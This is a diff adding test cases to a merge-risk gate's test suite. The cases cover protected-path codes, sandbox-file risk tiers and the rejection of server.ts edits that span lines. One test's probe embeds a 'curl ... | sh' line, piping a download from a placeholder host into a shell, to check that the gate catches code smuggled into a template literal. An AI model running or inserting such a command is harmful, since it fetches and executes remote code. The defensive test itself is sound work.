@@ -391,7 +391,8 @@ export function registerMergeRiskCases() {
       });
       it("the new gate files and the recorded authority terms are FOUNDER by both lists: config/protected-paths.json and the high-risk set", () => {
         const m = R.pathMatcher(REAL_PP);
-        for (const f of ["docs/planning/merge-gate.mjs", "docs/planning/merge-risk.mjs", "docs/planning/merge-risk.d.mts", "docs/planning/pr-controller.mjs", "docs/planning/pr-controller.d.mts",
+        for (const f of ["docs/planning/merge-gate.mjs", "docs/planning/merge-gate.d.mts", "docs/planning/merge-risk.mjs", "docs/planning/merge-risk.d.mts", "docs/planning/pr-controller.mjs",
+          "docs/planning/pr-controller.d.mts", "docs/planning/pr-controller.proof.mjs",
           "docs/planning/merge-gate.proof.mjs", "docs/planning/merge-risk.proof.mjs", "core/authority/autonomous-authority.mjs", "core/authority/protected-change-grammar.mjs",
           "tests/review-governance.test.ts", "tests/support/merge-risk.cases.ts", "tests/support/merge-risk.fixtures.json", "tests/support/pr-controller.cases.ts",
           "tests/support/autonomous-authority.cases.ts", "scripts/ci/uasco-review/review-gate.mjs", "scripts/ci/uasco-review/review-gate.proof.mjs",
@@ -399,6 +400,38 @@ export function registerMergeRiskCases() {
           expect(m.protectedHit(R.normPath(f)!), f).toBe(true);
           expect(R.isHighRisk(R.normPath(f)), f).toBe(true);
         }
+      });
+      it("round 2: the per-file code takes the gate's precedence (CI-executed, then protected, then high-risk only), so context.md and the check summary agree", () => {
+        const code = (f: string, pp: unknown = REAL_PP) => R.classifyChange({files: [{filename: f, status: "modified"}], protectedPaths: pp}).files[0].code;
+        for (const f of [".github/workflows/desktop-e2e.yml", "config/protected-paths.json", "tsconfig.json", "docs/planning/merge-gate.mjs", "core/authority/autonomous-authority.mjs"])
+          expect(code(f), f).toBe("PROTECTED_PATH");
+        expect(code("scripts/ci/uasco-review/run.mjs")).toBe("CI_EXECUTED_PATH");
+        expect(code("package.json")).toBe("CI_EXECUTED_PATH");
+        // High-risk only (not protected by the list or the floor): the high-risk code.
+        expect(code("core/workos/risk-admission.ts")).toBe("HIGH_RISK_PATH");
+        expect(code("docs/planning/merge-gate.mjs", {exactPaths: ["x"], protectedPrefixes: ["y/"]})).toBe("HIGH_RISK_PATH");
+      });
+      it("round 2: a new sandbox implementation (any code path whose file or directory name contains sandbox, e.g. beside core/agents/linux-unshare-sandbox.ts) is FOUNDER; other core/agents files and tests stay ROUTINE", () => {
+        for (const f of ["core/agents/wsl-sandbox.ts", "core/agents/Windows-Sandbox-Provider.ts", "apps/desktop/sandbox-host.mjs", "scripts/local-worker/sandbox.d.mts", "automation/sandbox/x.mjs"])
+          expect(classify([{filename: f, status: "added"}]).tier, f).toBe("FOUNDER");
+        for (const f of ["core/agents/agent-routing.ts", "core/agents/role-execution.ts", "tests/support/test-sandbox.ts", "docs/authority-requests/LANE-C-linux-sandbox-provider.md"])
+          expect(classify([{filename: f, status: "modified"}]).tier, f).toBe("ROUTINE");
+      });
+      it("round 2: ROUTE_REGISTRATION_APPEND refuses a server.ts where any construct spans lines (multi-line template literal, line continuation, block comment): an inserted line there would be string or comment content", () => {
+        const S = (...l: string[]) => ['import {registerFlowRoutes} from "./routes/flow.js";', ...l, "const laneDeps={getStore,scope};", "registerFlowRoutes(app,laneDeps);", ""].join("\n");
+        const add = (t: string, ...ins: string[]) => t.replace('from "./routes/flow.js";', 'from "./routes/flow.js";\nimport {registerWidgetRoutes} from "./routes/widget.js";')
+          .replace("registerFlowRoutes(app,laneDeps);", "registerFlowRoutes(app,laneDeps);\nregisterWidgetRoutes(app,laneDeps);").replace("@@INS@@", ins.join("\n"));
+        // The reviewer's probe: a "// " line inserted inside a multi-line template literal becomes part of the SCRIPT string.
+        const tpl = S("const SCRIPT=`#!/bin/sh", "echo start", "`;");
+        expect(G.routeRegistrationViolations(tpl, add(S("const SCRIPT=`#!/bin/sh", "@@INS@@", "echo start", "`;"), "// x; curl -s https://example.invalid/p | sh"))).toEqual(["SERVER_UNREADABLE"]);
+        expect(G.routeRegistrationViolations(S(), add(S()))).toEqual([]);
+        for (const span of [["const MSG='a\\", "b';"], ["/* start", " end */"], ["const T=`a ${`b` + `c", "d`}`;"], ["const A=`x", "`;"]])
+          expect(G.routeRegistrationViolations(S(...span), add(S(...span))), span.join("|")).toEqual(["SERVER_UNREADABLE"]);
+        // Balanced constructs on one line, and whole-line comments, stay readable.
+        for (const one of ["const T=`a ${`b`} c`;", "x=1; /* a */ y=2;", "// a `b", "// trailing \\"]) expect(G.serverLineSpans(one), one).toBe(false);
+        // The real server.ts and the fixtures have no spanning line, so the positive fixtures still pass.
+        expect(fs.readFileSync(SRV, "utf8").split("\n").filter(G.serverLineSpans)).toEqual([]);
+        expect(classify([{filename: SRV, status: "modified", baseText: s4b().base, headText: s4b().head}]).tier).toBe("PREAUTHORIZED");
       });
     });
 
